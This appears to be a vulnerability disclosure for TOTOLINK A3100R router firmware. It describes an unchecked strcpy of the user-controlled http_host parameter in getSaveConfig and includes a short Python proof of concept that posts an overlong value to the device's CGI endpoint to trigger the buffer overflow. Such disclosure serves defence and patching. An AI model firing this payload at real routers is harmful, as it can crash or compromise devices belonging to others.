## Overview

- Manufacturer's website information：https://www.totolink.net/
- Firmware download address ：https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/170/ids/36.html

## Affected version

A3100R V4.1.2cu.5050_B20200504

## Vulnerability details

In the A3100R V4.1.2cu.5050_B20200504 firmware has a buffer overflow vulnerability in the `getSaveConfig` function. The `v6` variable receives the `http_host` parameter from a POST request. However, since the user can control the input of `http_host`, the statement `strcpy((char *)v13, v6);` can cause a buffer overflow injection vulnerability.

![image-20240719230945874](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240719230945874.png)

## POC

```python
import requests
url = "http://127.0.0.1/cgi-bin/cstecgi.cgi?action=save&setting"
cookie = {"Cookie":"SESSION_ID=2:1721039211:2"}
data = {"http_host":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"}
response = requests.post(url, cookies=cookie, json=data)
print(response.text)
print(response)
```

![image-20240719231229911](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240719231229911.png)
